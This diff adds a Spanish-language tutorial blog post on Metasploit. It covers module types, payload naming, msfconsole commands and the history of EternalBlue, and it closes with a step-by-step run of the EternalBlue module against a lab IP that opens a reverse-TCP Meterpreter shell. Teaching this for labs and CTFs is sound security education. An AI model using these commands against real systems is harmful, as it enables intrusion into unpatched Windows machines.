@@ -1,0 +1,354 @@
+---
+title: "Metasploit: la navaja suiza del pentesting"
+date: 2026-04-12
+excerpt: "El framework de explotación más usado del mundo: los 7 tipos de módulos, la diferencia entre exploit y payload, staged vs inline, msfconsole, y EternalBlue como ejemplo histórico."
+tags: ["net", "fundamentos"]
+series: metasploit
+usefulFor:
+  - { area: "pentesting", pct: 100 }
+  - { area: "CTF / hacking", pct: 95 }
+  - { area: "fundamentos de seguridad", pct: 70 }
+draft: false
+---
+
+import Callout from '../../components/Callout.astro';
+import Terminal from '../../components/Terminal.astro';
+import Mermaid from '../../components/Mermaid.astro';
+import Accordion from '../../components/Accordion.astro';
+import Compare from '../../components/Compare.astro';
+import BarChart from '../../components/BarChart.astro';
+import Step from '../../components/Step.astro';
+
+En el [post de CVE-2024-21413](/salas/cve/cve-2024-21413-moniker-link) usamos un script Python manual para explotar la vulnerabilidad: buscar un PoC en GitHub, adaptarlo, debuggearlo, correrlo. Funciona, pero es artesanal. Cada vulnerabilidad nueva requiere empezar de cero.
+
+Metasploit es la respuesta a ese proceso. En lugar de armar todo a mano, tenés un framework con **miles de módulos listos para usar** — buscás, configurás, ejecutás. Es la diferencia entre fabricar una herramienta cada vez que necesitás una y abrir una navaja suiza.
+
+---
+
+## Qué es Metasploit
+
+El framework de explotación más usado en pentesting. Cubre todas las fases: reconocimiento, scanning, explotación, post-explotación.
+
+<Compare
+  headers={["Interfaz", "Costo", "Uso típico"]}
+  rows={[
+    ["Metasploit Pro", "GUI + consola", "Comercial", "Empresas, reportes automatizados"],
+    ["Metasploit Framework", "Terminal (msfconsole)", "Open source", "CTFs, pentesting real, aprendizaje"],
+  ]}
+/>
+
+**Metasploit Framework** es el que nos importa. Viene instalado por defecto en Kali Linux y en el AttackBox de TryHackMe. Se lanza con `msfconsole`.
+
+---
+
+## Los tres conceptos base
+
+Antes de hablar de módulos, tres términos que van a aparecer en absolutamente todo:
+
+```
+Vulnerabilidad → la puerta rota
+Exploit        → la ganzúa que la abre
+Payload        → lo que hacés una vez adentro
+```
+
+**Vulnerabilidad** — el error en sí. Un bug en el código, un diseño malo, una lógica rota. Existe independientemente de si alguien la explota.
+
+**Exploit** — el código que aprovecha esa vulnerabilidad. Es el "cómo entro". El `exploit.py` del post de [MonikerLink](/salas/cve/cve-2024-21413-moniker-link) era exactamente esto — un script que armaba el email malicioso para triggear el bug.
+
+**Payload** — lo que querés que pase después de entrar. El exploit abre la puerta, el payload es lo que hacés adentro. Puede ser abrir una [shell](/salas/linux-fundamentals/shells-de-linux), crear un usuario, ejecutar un comando, instalar un backdoor.
+
+<Mermaid title="La secuencia de cualquier ataque" chart={`
+flowchart LR
+  VULN["Vulnerabilidad\n(el bug)"] --> EXPLOIT["Exploit\n(el código que lo usa)"]
+  EXPLOIT --> PAYLOAD["Payload\n(lo que hacés adentro)"]
+  PAYLOAD --> RESULT["Shell / credenciales\n/ persistencia"]
+`} />
+
+---
+
+## Los 7 tipos de módulos
+
+Metasploit organiza todo en siete categorías. Es una taxonomía que vale entender porque define cómo pensás el ataque.
+
+### Auxiliary — reconocimiento y escaneo
+
+Todo lo que no es explotar directamente. Scanners, crawlers, fuzzers, sniffers. Es el reconocimiento — antes de atacar, necesitás saber qué hay en la red.
+
+Subcarpetas relevantes: `scanner` (la más usada), `dos`, `sqli`, `spoof`, `gather`.
+
+### Exploits — los módulos de ataque
+
+Los módulos que efectivamente comprometen la máquina. Organizados por sistema operativo: `windows`, `linux`, `android`, `apple_ios`, `osx`, `multi`. También hay carpetas para sistemas legacy como `aix`, `solaris`, `mainframe` — infraestructura vieja que todavía existe en grandes empresas.
+
+### Payloads — el código que corre en la víctima
+
+Tiene cuatro subcategorías:
+
+<Compare
+  headers={["Qué hace", "Cómo lo identificás en el nombre"]}
+  rows={[
+    ["Singles", "Payload completo en un solo paquete, autosuficiente", "shell_reverse_tcp (con _)"],
+    ["Stagers", "Payload chico que establece conexión y baja el stage", "shell/reverse_tcp (con /)"],
+    ["Stages", "Payload pesado que descarga el stager", "Se combina automáticamente con el stager"],
+    ["Adapters", "Envuelve un payload en otro formato (ej: PowerShell)", "Prefijo del formato destino"],
+  ]}
+/>
+
+La forma de distinguir **staged vs single** en el nombre es clave:
+
+```
+generic/shell_reverse_tcp        ← _ entre shell y reverse = SINGLE (inline)
+windows/x64/shell/reverse_tcp   ← / entre shell y reverse = STAGED
+```
+
+<Callout type="tip" title="¿Cuándo usar staged vs single?">
+  **Single** cuando el canal es estable y no hay restricciones de tamaño. **Staged** cuando el canal inicial es limitado (ej: un buffer overflow con espacio reducido) — el stager es chico, pasa por el hueco, y después baja el payload completo.
+</Callout>
+
+### Encoders — evasión básica de antivirus
+
+Codifican el payload para intentar evadir antivirus. Los AV tradicionales comparan archivos contra una base de datos de firmas conocidas — si el payload está codificado diferente, puede no matchear. Tienen éxito limitado porque los antivirus modernos también analizan comportamiento. Organizados por arquitectura: `x86`, `x64`, `php`, `cmd`.
+
+### Evasion — evasión avanzada
+
+Más sofisticado que los encoders. No solo cambia cómo se ve el payload, cambia cómo se comporta para evadir detección activa. Históricamente solo para Windows (AppLocker, Windows Defender).
+
+### NOPs — relleno técnico
+
+Instrucciones que le dicen al CPU "no hagas nada este ciclo". Se usan como relleno para que los payloads tengan tamaños exactos y consistentes. Metasploit lo maneja automáticamente — no es algo con lo que vas a interactuar directamente.
+
+### Post — después de comprometer
+
+Módulos para después de entrar. Escalar privilegios, moverse lateralmente por la red, extraer credenciales, mantener persistencia. Organizados por plataforma: `windows`, `linux`, `android`, `osx`, `multi`.
+
+---
+
+## msfconsole — la terminal de Metasploit
+
+Se lanza con `msfconsole`. Funciona como una terminal Linux normal — podés hacer `ls`, `ping`, `clear` — pero con contexto propio.
+
+<Terminal title="Lanzar Metasploit" lines={[
+  { type: "prompt", text: "msfconsole" },
+  { type: "output", text: "" },
+  { type: "output", text: "      =[ metasploit v6.4.1-dev ]" },
+  { type: "highlight", text: "+ -- --=[ 2397 exploits - 1239 auxiliary - 422 post ]" },
+  { type: "output", text: "+ -- --=[ 1468 payloads - 47 encoders - 11 nops ]" },
+  { type: "output", text: "" },
+  { type: "success", text: "msf6 > " },
+]} />
+
+### Los cinco prompts que vas a ver
+
+Importante no confundirlos — cada uno habilita comandos distintos:
+
+```
+root@kali:~#                              → terminal Linux normal
+msf6 >                                    → Metasploit abierto, sin módulo
+msf6 exploit(windows/smb/ms17_010...) >  → dentro de un módulo
+meterpreter >                             → explotaste la máquina, estás adentro
+C:\Windows\system32>                      → shell directa en la víctima
+```
+
+<Callout type="warning" title="Contexto importa">
+  Si ejecutás `set RHOSTS 10.10.1.1` en el prompt `msf6 >` sin haber seleccionado un módulo, no pasa nada útil. Si ejecutás `sessions` dentro de un módulo, funciona. Prestale atención al prompt para saber dónde estás parado.
+</Callout>
+
+---
+
+## Comandos esenciales
+
+### Buscar módulos
+
+<Terminal title="search — encontrar lo que necesitás" lines={[
+  { type: "prompt", text: "msf6 > search ms17-010" },
+  { type: "output", text: "Matching Modules" },
+  { type: "output", text: "================" },
+  { type: "output", text: "#  Name                                      Rank      Description" },
+  { type: "output", text: "-  ----                                      ----      -----------" },
+  { type: "highlight", text: "0  exploit/windows/smb/ms17_010_eternalblue  average   MS17-010 EternalBlue" },
+  { type: "output", text: "1  exploit/windows/smb/ms17_010_psexec        normal    MS17-010 EternalRomance" },
+  { type: "output", text: "2  auxiliary/scanner/smb/smb_ms17_010         normal    MS17-010 SMB Vuln Detection" },
+  { type: "prompt", text: "msf6 > search type:auxiliary telnet" },
+  { type: "prompt", text: "msf6 > search cve:2024 type:exploit" },
+]} />
+
+### Seleccionar y configurar
+
+<Terminal title="use + show options + set" lines={[
+  { type: "prompt", text: "msf6 > use exploit/windows/smb/ms17_010_eternalblue" },
+  { type: "prompt", text: "msf6 exploit(ms17_010_eternalblue) > show options" },
+  { type: "output", text: "" },
+  { type: "output", text: "Name     Current Setting  Required  Description" },
+  { type: "output", text: "----     ---------------  --------  -----------" },
+  { type: "output", text: "RHOSTS                    yes       Target address" },
+  { type: "output", text: "RPORT    445              yes       Target port (TCP)" },
+  { type: "output", text: "LHOST                     yes       Listen address" },
+  { type: "output", text: "LPORT    4444             yes       Listen port" },
+  { type: "output", text: "" },
+  { type: "cmd", text: "set RHOSTS 10.10.165.39" },
+  { type: "success", text: "RHOSTS => 10.10.165.39" },
+  { type: "cmd", text: "set LHOST 10.10.44.70" },
+  { type: "success", text: "LHOST => 10.10.44.70" },
+]} />
+
+### set vs setg
+
+<Compare
+  headers={["Alcance", "Cuándo usar"]}
+  rows={[
+    ["set RHOSTS 10.10.1.1", "Solo el módulo actual", "Cuando trabajás con un target específico"],
+    ["setg RHOSTS 10.10.1.1", "Global — todos los módulos", "Cuando todos los módulos apuntan al mismo target"],
+    ["unset RHOSTS", "Borra del módulo actual", "Cambiar de target"],
+    ["unset all", "Borra todo", "Empezar de cero"],
+  ]}
+/>
+
+### Ejecutar
+
+<Terminal title="exploit / run / check" lines={[
+  { type: "prompt", text: "msf6 exploit(ms17_010_eternalblue) > check" },
+  { type: "success", text: "[+] 10.10.165.39:445 - Host IS likely VULNERABLE to MS17-010!" },
+  { type: "prompt", text: "msf6 exploit(ms17_010_eternalblue) > exploit" },
+  { type: "output", text: "[*] Started reverse TCP handler on 10.10.44.70:4444" },
+  { type: "output", text: "[*] Sending exploit packet..." },
+  { type: "success", text: "[*] Meterpreter session 1 opened (10.10.44.70:4444 -> 10.10.165.39:49162)" },
+  { type: "output", text: "" },
+  { type: "highlight", text: "meterpreter > " },
+]} />
+
+<Callout type="info" title="exploit vs run vs check">
+  `exploit` y `run` son alias — hacen lo mismo. `exploit -z` lanza y manda la sesión al background automáticamente. `check` verifica si la víctima es vulnerable **sin explotar** (cuando el módulo lo soporta).
+</Callout>
+
+---
+
+## El ranking de módulos
+
+Cada módulo tiene un ranking que indica confiabilidad:
+
+<BarChart
+  title="Ranking de confiabilidad"
+  bars={[
+    { label: "excellent", value: 7, color: "#00b894" },
+    { label: "great", value: 6, color: "#00cec9" },
+    { label: "good", value: 5, color: "#0984e3" },
+    { label: "normal", value: 4, color: "#6c5ce7" },
+    { label: "average", value: 3, color: "#fdcb6e" },
+    { label: "low", value: 2, color: "#e17055" },
+    { label: "manual", value: 1, color: "#d63031" },
+  ]}
+  max={7}
+/>
+
+<Callout type="warning">
+  El ranking es una guía, no una garantía. Un exploit `average` puede funcionar perfectamente en un caso específico, y uno `excellent` puede fallar. EternalBlue tiene ranking `average` y es de los más exitosos de la historia.
+</Callout>
+
+---
+
+## Sessions — las conexiones con las víctimas
+
+Cuando un exploit funciona, se crea una **sesión** — el canal de comunicación persistente entre Metasploit y la máquina comprometida. Podés tener múltiples sesiones abiertas simultáneamente.
+
+<Terminal title="Gestionar sesiones" lines={[
+  { type: "prompt", text: "msf6 > sessions" },
+  { type: "output", text: "" },
+  { type: "output", text: "  Id  Type           Connection" },
+  { type: "output", text: "  --  ----           ----------" },
+  { type: "highlight", text: "  1   meterpreter    10.10.44.70:4444 -> 10.10.165.39:49162" },
+  { type: "output", text: "  2   shell           10.10.44.70:4445 -> 10.10.165.40:52341" },
+  { type: "output", text: "" },
+  { type: "cmd", text: "sessions -i 1" },
+  { type: "success", text: "meterpreter > " },
+  { type: "prompt", text: "meterpreter > background" },
+  { type: "output", text: "[*] Backgrounding session 1..." },
+  { type: "success", text: "msf6 > " },
+]} />
+
+---
+
+## EternalBlue — el ejemplo histórico
+
+Vale conocer la historia porque es uno de los exploits más famosos de la historia de la ciberseguridad — y el que vas a usar para practicar.
+
+### La vulnerabilidad
+
+Un error matemático en **SMBv1** — el protocolo de Windows para compartir archivos en red (el mismo protocolo que vimos en el post de [MonikerLink](/salas/cve/cve-2024-21413-moniker-link) filtrando hashes NTLM). Al restar un número de 32 bits de uno de 16 bits, se produce un **buffer overflow** en el kernel que permite ejecución de código arbitrario.
+
+### El origen
+
+Supuestamente desarrollado por la **NSA** como arma cibernética. En abril de 2017 el grupo **Shadow Brokers** filtró públicamente el exploit junto con otras herramientas de la NSA.
+
+Un mes después, en mayo de 2017, el ransomware **WannaCry** lo usó para infectar más de 200.000 máquinas en 150 países en cuestión de horas. Hospitales, empresas, gobiernos — todo cayó.
+
+<Mermaid title="La cadena de EternalBlue a WannaCry" chart={`
+flowchart LR
+  NSA["NSA desarrolla\nEternalBlue"] --> SB["Shadow Brokers\nlo filtra (abril 2017)"]
+  SB --> WC["WannaCry lo usa\n(mayo 2017)"]
+  WC --> IMPACT["200.000+ máquinas\n150 países"]
+`} />
+
+### Por qué sigue importando
+
+Windows 7 y Server 2008 siguen corriendo en muchas redes corporativas. En CTFs y pentesting real, EternalBlue aparece constantemente. Es el módulo con el que vas a practicar en los próximos posts.
+
+---
+
+## El flujo completo — de cero a shell
+
+<Step n={1} title="Abrir Metasploit" label="inicio" />
+
+```bash
+msfconsole
+```
+
+<Step n={2} title="Buscar el módulo" label="reconocimiento" />
+
+```bash
+search ms17-010
+```
+
+<Step n={3} title="Seleccionar y configurar" label="configuración" />
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.165.39
+set LHOST 10.10.44.70
+```
+
+<Step n={4} title="Verificar y explotar" label="ataque" />
+
+```bash
+check
+exploit
+```
+
+<Step n={5} title="Estás adentro" label="post-explotación" last={true} />
+
+```
+meterpreter > sysinfo
+Computer    : JON-PC
+OS          : Windows 7 (6.1 Build 7601, Service Pack 1)
+Arch        : x64
+Meterpreter : x64/windows
+```
+
+---
+
+## Lo que viene
+
+Este post cubre los fundamentos — la taxonomía de módulos, los comandos básicos y el contexto histórico. La serie de Metasploit continúa con:
+
+- **Metasploit Exploitation** — usar módulos para comprometer máquinas reales
+- **Meterpreter** — el payload más poderoso de Metasploit y todo lo que permite hacer en post-explotación
+- **Blue** — una máquina Windows real para hackear aplicando todo lo aprendido, con EternalBlue como protagonista
+
+---
+
+## Conexiones con el blog
+
+- El `exploit.py` manual de [CVE-2024-21413](/salas/cve/cve-2024-21413-moniker-link) es exactamente lo que Metasploit reemplaza con módulos listos para usar
+- EternalBlue explota **SMB** — el mismo protocolo que filtra hashes NTLM en MonikerLink
+- Los hashes que extraés en post-explotación se crackean con [John the Ripper](/salas/crypto/john-the-ripper) (`--format=nt` para NTLM local, `--format=netntlmv2` para capturas de red)
+- `msfconsole` es una [shell](/salas/linux-fundamentals/shells-de-linux) especializada — funciona como Bash pero con contexto de explotación
+- Reverse shells y payloads conectan directamente con el concepto de shells interactivas y no interactivas
